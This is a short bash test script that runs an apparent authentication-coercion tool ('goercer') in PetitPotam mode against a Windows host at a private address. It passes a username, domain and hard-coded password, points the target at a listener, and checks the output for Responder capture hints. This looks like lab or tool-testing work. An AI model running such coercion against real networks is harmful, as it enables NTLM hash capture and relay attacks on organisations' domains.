#!/bin/bash
echo "Test 1: Path with file.txt"
./goercer -t 10.1.1.11 -l 10.1.1.99 -u slacker -d spinninglikea.top -p 'Sh0ckermc!' -m petitpotam 2>&1 | grep -E "Trying PetitPotam opnum 0|Check Responder"
sleep 3
echo -e "\nDid that work? (current path: \\\\10.1.1.99\\test\\Settings.ini)"
